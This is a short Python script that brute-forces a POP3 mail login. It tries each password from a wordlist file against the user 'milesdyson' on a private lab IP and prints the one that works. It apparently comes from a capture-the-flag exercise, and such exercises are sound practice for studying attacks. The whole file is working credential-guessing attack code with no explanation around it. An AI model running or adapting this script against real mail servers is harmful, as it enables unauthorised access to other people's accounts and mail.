import poplib

HOST = "10.10.76.96"
USER = "milesdyson"

with open("log1.txt") as f:
    for pwd in f.read().splitlines():
        try:
            pop3 = poplib.POP3(HOST)
            pop3.user(USER)
            resp = pop3.pass_(pwd)
            print(f"[+] Correct password found: {pwd}")
            break
        except poplib.error_proto:
            continue
